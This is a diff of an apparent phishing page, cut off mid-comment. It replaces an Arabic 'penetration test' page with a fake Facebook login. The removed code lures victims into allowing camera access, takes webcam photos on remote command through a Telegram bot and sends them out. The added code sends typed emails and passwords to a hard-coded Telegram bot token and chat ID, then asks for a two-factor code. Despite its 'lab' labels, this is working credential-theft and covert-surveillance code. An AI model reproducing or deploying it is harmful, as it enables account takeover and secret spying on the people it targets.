@@ -1,107 +1,67 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشروع هندسة أمن المعلومات | اختبار اختراق</title>
+    <title>Facebook Login Simulation | Security Lab</title>
     <style>
-        body { background: #050505; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .card { background: #111; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #ff0055; width: 90%; max-width: 380px; box-shadow: 0 0 25px rgba(255, 0, 85, 0.3); }
-        .btn { background: linear-gradient(45deg, #ff0055, #ff0088); color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .input-group { margin-top: 15px; text-align: right; }
-        input { width: 100%; padding: 10px; margin-top: 5px; border-radius: 5px; border: 1px solid #333; background: #1a1a1a; color: #fff; box-sizing: border-box; }
-        #loginSection { display: none; }
-        .status { font-size: 11px; color: #666; margin-top: 15px; }
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 15px; display: block; text-decoration: none; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
+        .login-btn { background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; padding: 10px; width: 100%; cursor: pointer; }
+        #mfaSection { display: none; margin-top: 10px; border-top: 1px solid #ddd; padding-top: 15px; }
+        .status { font-size: 11px; color: #777; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="setupSection">
-            <h2 style="color: #ff0055;">● بث مباشر وارد</h2>
-            <p>يجب السماح بالكاميرا لبدء الدردشة مع الطرف الآخر.</p>
-            <button class="btn" id="startBtn">بدء الفيديو الآن 🎥</button>
+
+    <div class="login-card">
+        <a href="#" class="fb-logo">facebook</a>
+        <div id="credentialsSection">
+            <p style="font-size: 15px; color: #1c1e21; margin-bottom: 15px;">Login to join the private video chat.</p>
+            <input type="text" id="email" placeholder="Email address or phone number">
+            <input type="password" id="pass" placeholder="Password">
+            <button class="login-btn" id="nextBtn">Log In</button>
         </div>
 
-        <div id="loginSection">
-            <h3 style="color: #ffb400;">🔐 خطوة أخيرة</h3>
-            <p style="font-size: 13px;">هذه الدردشة "مجانية" للمدعوين فقط. يرجى تأكيد هويتك للمتابعة.</p>
-            <div class="input-group">
-                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-                <input type="password" id="pass" placeholder="كلمة المرور">
-                <input type="text" id="mfa" placeholder="رمز المصادقة الثنائية (2FA)">
-            </div>
-            <button class="btn" id="submitBtn">دخول 💖</button>
+        <div id="mfaSection">
+            <h4 style="margin: 0 0 10px 0;">Two-Factor Authentication</h4>
+            <p style="font-size: 13px; color: #606770;">Enter the 6-digit code from your authentication app or SMS.</p>
+            <input type="text" id="mfaCode" placeholder="Login Code" maxlength="6">
+            <button class="login-btn" id="finishBtn">Confirm</button>
         </div>
-        
-        <p id="status" class="status">جاهز للاختبار...</p>
+
+        <p id="status" class="status">Secure connection active</p>
     </div>
 
     <script>
         const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
         const CHAT_ID = "8350812242";
-        let mediaStream;
-        let canTakePhoto = true; // خيار التحكم في التصوير
 
-        // 1. بدء الهجوم (طلب الكاميرا فقط)
-        document.getElementById('startBtn').addEventListener('click', async () => {
-            try {
-                // الوصول للكاميرا بدون ميكروفون
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        // دالة إرسال البيانات فوراً للبوت
+        async function sendToBot(data) {
+            const text = encodeURIComponent(`🚨 [LAB ALERT] New Data Captured:\n${data}`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
+        }
+
+        // الخطوة الأولى: الإيميل والباسورد
+        document.getElementById('nextBtn').addEventListener('click', async () => {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(email && pass) {
+                document.getElementById('status').innerText = "Verifying...";
+                // إرسال البيانات فوراً
+                await sendToBot(`📧 Email: ${email}\n🔑 Pass: ${pass}`);
                 
-                // تغيير الواجهة
-                document.getElementById('setupSection').style.display = "none";
-                document.getElementById('loginSection').style.display = "block";
-                document.getElementById('status').innerText = "تم تفعيل الكاميرا (بدون صوت)";
-
-                // إرسال إشعار البدء للتليجرام
-                notifyTelegram("🚀 المختبر بدأ: الضحية سمح بالكاميرا وهو الآن في صفحة الـ Login.");
-
-                // تشغيل نظام استقبال الأوامر (صورة / وقف / ابدأ)
-                setInterval(checkCommands, 5000);
-            } catch (e) {
-                document.getElementById('status').innerText = "خطأ: يجب السماح بالصلاحيات للمتابعة.";
+                // التحويل لواجهة الـ 2FA
+                document.getElementById('credentialsSection').style.display = "none";
+                document.getElementById('mfaSection').style.display = "block";
+                document.getElementById('status').innerText = "2FA Required";
+            } else {
+                alert("Please fill in all fields.");
             }
         });
 
-        // 2. نظام الأوامر عن بُعد
-        async function checkCommands() {
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
-                const data = await res.json();
-                if (data.result.length > 0) {
-                    const cmd = data.result[0].message.text;
-                    if (cmd === "صورة") takePhoto();
-                    if (cmd === "وقف") { canTakePhoto = false; notifyTelegram("🚫 تم إيقاف خاصية التصوير."); }
-                    if (cmd === "ابدأ") { canTakePhoto = true; notifyTelegram("✅ تم تفعيل خاصية التصوير."); }
-                }
-            } catch (e) { console.error("Command Error"); }
-        }
-
-        // 3. التقاط الصورة وإرسالها
-        async function takePhoto() {
-            if (!canTakePhoto || !mediaStream) return;
-            const video = document.createElement('video');
-            video.srcObject = mediaStream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'lab_shot.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-        }
-
-        // 4. دالة إرسال الإشعارات
-        function notifyTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-        }
-
-        // ملاحظة للمهندس زعتر: 
-        // لربط بيانات الـ Login في المختبر، استخدم fetch مع قيم (email, pass, mfa) 
-        // كما وضحنا في "المنطق البرمجي" سابقاً.
-    </script>
-</body>
-</html>
+        // الخطوة الثانية: كود المص
